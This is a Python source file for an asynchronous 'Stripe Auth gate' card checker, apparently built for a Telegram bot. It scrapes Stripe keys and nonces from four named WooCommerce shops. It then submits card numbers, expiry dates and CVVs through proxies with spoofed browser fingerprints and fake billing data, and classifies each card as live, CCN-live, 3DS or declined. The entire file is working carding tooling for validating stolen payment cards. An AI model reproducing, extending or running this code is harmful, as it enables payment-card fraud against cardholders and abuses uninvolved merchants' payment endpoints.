"""chk.py — Stripe Auth gate (WooCommerce add-payment-method). Non-blocking async engine."""

import json
import random
import re
import uuid
import asyncio
import httpx

REQUEST_TIMEOUT = 15.0

CHK_SITES = [
    "https://dilaboards.com",
    "https://shop.mydario.com",
    "https://www.oliveadot.com",
    "https://dice-heads.com",
]

CCN_WRONG_REGEX = [re.compile(p, re.I) for p in (
    r"incorrect[_ ]cvc", r"cvc[_ ]check:\s*fail", r"invalid[_ ]cvc",
    r"cvv[_ ]decline", r"declined[_ ]cvv", r"wrong[_ ]cvc", r"cvc[_ ]failure",
    r"cvv[_ ]check:\s*incorrect", r"card's security code is incorrect",
    r"the cvc code is incorrect", r"cvc mismatch", r"security code incorrect",
    r"cvc does not match", r"security code is invalid", r"invalid security code",
)]

CVV_APPROVED_REGEX = [re.compile(p, re.I) for p in (
    r"succeeded", r"success", r"payment method added", r"authorized", r"approved",
    r"completed", r"processed", r"payment successful", r"added successfully",
    r"card added successfully", r"payment method added successfully",
)]

_BILLING = [
    {"postcode": "1000", "country": "PH"},
    {"postcode": "1100", "country": "PH"},
    {"postcode": "1200", "country": "PH"},
    {"postcode": "1600", "country": "PH"},
    {"postcode": "6000", "country": "PH"},
    {"postcode": "10001", "country": "US"},
]

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)


def _parse_between(data, start, end):
    try:
        i = data.index(start) + len(start)
        return data[i:data.index(end, i)]
    except (ValueError, IndexError, AttributeError):
        return None


def _extract_pk(html):
    if not html:
        return None
    for pat in (r"pk_live_[A-Za-z0-9]{24,}", r"pk_test_[A-Za-z0-9]{24,}", r"pk_(?:live|test)_[A-Za-z0-9_]+"):
        m = re.search(pat, html)
        if m:
            return m.group(0)
    return None


def _detect_status(msg):
    if not msg:
        return "DECLINED"
    for p in CVV_APPROVED_REGEX:
        if p.search(msg):
            return "CVV_APPROVED"
    for p in CCN_WRONG_REGEX:
        if p.search(msg):
            return "CCN_APPROVED"
    return "DECLINED"


def _is_card_response(msg):
    if _detect_status(msg) != "DECLINED":
        return True
    ml = str(msg).lower()
    return any(k in ml for k in (
        "card", "invalid", "declined", "insufficient", "expired", "cvc",
        "security", "incorrect", "wrong", "fraud", "stolen", "restricted",
        "honor", "limit", "3ds", "challenge",
    ))


async def _check_on_site_async(site_url: str, cc: str, mm: str, yy: str, cvv: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    billing = random.choice(_BILLING)
    headers = {
        "User-Agent": _UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }

    try:
        async with httpx.AsyncClient(proxy=proxy_url if proxy_url else None, timeout=REQUEST_TIMEOUT, follow_redirects=True) as client:
            page = await client.get(
                f"{site_url}/my-account/add-payment-method/",
                headers=headers,
            )
            if page.status_code != 200:
                return "error", f"HTTP {page.status_code}", "site_error"

            pk = _extract_pk(page.text)
            if not pk:
                return "error", "Stripe PK not found", "site_error"

            nonce = _parse_between(page.text, '"createAndConfirmSetupIntentNonce":"', '"')
            if not nonce:
                m = re.search(
                    r'woocommerce_tokenization_form_params = {.*?"nonce":"([^"]+)"',
                    page.text, re.DOTALL,
                )
                nonce = m.group(1) if m else None
            if not nonce:
                return "error", "Setup nonce not found", "site_error"

            stripe_data = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "billing_details[address][postal_code]": billing["postcode"],
                "billing_details[address][country]": billing["country"],
                "pasted_fields": "number",
                "payment_user_agent": "stripe.js/41ba105bc6; stripe-js-v3/41ba105bc6; payment-element; deferred-intent&",
                "referrer": site_url,
                "time_on_page": str(random.randint(5000, 30000)),
                "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
                "guid": str(uuid.uuid4()),
                "muid": str(uuid.uuid4()),
                "sid": str(uuid.uuid4()),
                "key": pk,
                "_stripe_version": "2024-06-20",
            }

            stripe_resp = await client.post(
                "https://api.stripe.com/v1/payment_methods",
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": _UA,
                },
                data=stripe_data,
            )

            try:
                stripe_json = stripe_resp.json()
            except Exception:
                return "error", "Invalid Stripe response", "site_error"

            pm_id = stripe_json.get("id")
            if not pm_id:
                err = stripe_json.get("error", {}).get("message", "Unknown error")
                if _detect_status(err) == "CCN_APPROVED":
                    return "ccn", err, "ccn"
                if _is_card_response(err):
                    return "declined", err, "declined"
                return "error", err, "site_error"

            host = site_url.replace("https://", "").replace("http://", "").split("/")[0]
            ajax_resp = await client.post(
                f"{site_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                headers={
                    "accept": "*/*",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": site_url,
                    "referer": f"{site_url}/my-account/add-payment-method/",
                    "user-agent": _UA,
                    "x-requested-with": "XMLHttpRequest",
                    "authority": host,
                },
                data={
                    "action": "create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": pm_id,
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": nonce,
                },
            )

            try:
                ajax_json = ajax_resp.json()
            except Exception:
                return "error", "Invalid AJAX response", "site_error"

            if ajax_json.get("success") and ajax_json.get("data", {}).get("status") == "succeeded":
                return "approved", "Payment method added successfully", "cvv_approved"

            data_obj = ajax_json.get("data", {}) if isinstance(ajax_json, dict) else {}
            status_val = data_obj.get("status") if isinstance(data_obj, dict) else None
            if status_val in ("requires_action", "requires_source_action") or "requires_action" in str(ajax_json):
                return "3ds", "3D Secure Challenge Required", "3ds"

            msg = data_obj.get("error", {}).get("message", "Card declined") if isinstance(data_obj, dict) else "Card declined"
            if _detect_status(msg) == "CCN_APPROVED":
                return "ccn", msg, "ccn"
            if _is_card_response(msg):
                return "declined", msg, "declined"
            return "error", msg, "site_error"
    except Exception as e:
        return "error", str(e)[:120], "site_error"


def _check_on_site(site_url, cc, mm, yy, cvv, proxy_url=None):
    """Synchronous compatibility wrapper calling async execution loop."""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor() as pool:
                future = pool.submit(asyncio.run, _check_on_site_async(site_url, cc, mm, yy, cvv, proxy_url))
                return future.result()
        else:
            return loop.run_until_complete(_check_on_site_async(site_url, cc, mm, yy, cvv, proxy_url))
    except Exception:
        return asyncio.run(_check_on_site_async(site_url, cc, mm, yy, cvv, proxy_url))


async def check_card_async(cc: str, mm: str, yy: str, cvv: str, max_retries: int = 4, proxy_url: str | None = None) -> tuple[str, str, str, str]:
    """Asynchronous primary entrypoint for Telethon / bot handlers."""
    cc = re.sub(r"\D", "", str(cc))
    mm_str = str(mm).zfill(2)
    yy_str = str(yy).strip()
    if len(yy_str) == 2:
        yy_str = f"20{yy_str}"

    try:
        m_int = int(mm_str)
    except ValueError:
        m_int = 0

    if not (13 <= len(cc) <= 19 and 1 <= m_int <= 12 and 3 <= len(str(cvv)) <= 4):
        return "error", "Invalid card format", "bad_format", ""

    attempted = set()
    last_msg = "All sites failed"

    for _ in range(max_retries):
        site_url = random.choice(CHK_SITES)
        n = 0
        while site_url in attempted and n < len(CHK_SITES) * 2:
            site_url = random.choice(CHK_SITES)
            n += 1
        attempted.add(site_url)
        site_url = site_url.rstrip("/")

        try:
            status, msg, code = await _check_on_site_async(site_url, cc, mm_str, yy_str, str(cvv), proxy_url=proxy_url)
            if code != "site_error":
                return status, msg, code, site_url
            last_msg = msg
        except Exception as e:
            last_msg = str(e)[:120]

    return "error", last_msg, "connection_error", ""


def check_card(cc, mm, yy, cvv, max_retries=4, proxy_url=None):
    """Returns (status, message, code, site_url)."""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor() as pool:
                future = pool.submit(asyncio.run, check_card_async(cc, mm, yy, cvv, max_retries=max_retries, proxy_url=proxy_url))
                return future.result()
        else:
            return loop.run_until_complete(check_card_async(cc, mm, yy, cvv, max_retries=max_retries, proxy_url=proxy_url))
    except Exception:
        return asyncio.run(check_card_async(cc, mm, yy, cvv, max_retries=max_retries, proxy_url=proxy_url))


def check_card_str(cc_str, max_retries=4, proxy_url=None):
    parts = str(cc_str).split("|")
    if len(parts) < 4:
        return "error", "Invalid CC format", "bad_format", ""
    return check_card(parts[0], parts[1], parts[2], parts[3], max_retries=max_retries, proxy_url=proxy_url)
